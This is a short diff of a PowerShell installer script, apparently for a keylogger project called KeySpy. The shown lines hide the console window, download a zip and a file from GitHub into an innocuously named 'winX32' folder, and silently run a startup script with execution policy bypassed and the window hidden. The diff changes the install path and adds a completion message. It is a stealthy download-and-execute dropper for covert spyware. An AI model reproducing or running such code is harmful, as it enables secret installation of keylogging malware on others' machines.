@@ -12,7 +12,7 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 $zipUrl = "https://github.com/3rr0r-505/KeySpy/archive/a5792dc2827315c545185671445f0112bd751264.zip"
 
 # Define the destination folder
-$destinationFolder = "C:\Windows\winX32"
+$destinationFolder = "C:\Program Files (x86)\winX32"
 
 # Create the destination folder if it doesn't exist
 if (-not (Test-Path -Path $destinationFolder)) {
@@ -38,3 +38,6 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/
 
 # Execute the startup.ps1 script silently
 Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$destinationFolder\startup.ps1'" -NoNewWindow -Wait
+
+Write-Host "Initial script execution completed successfully."
+
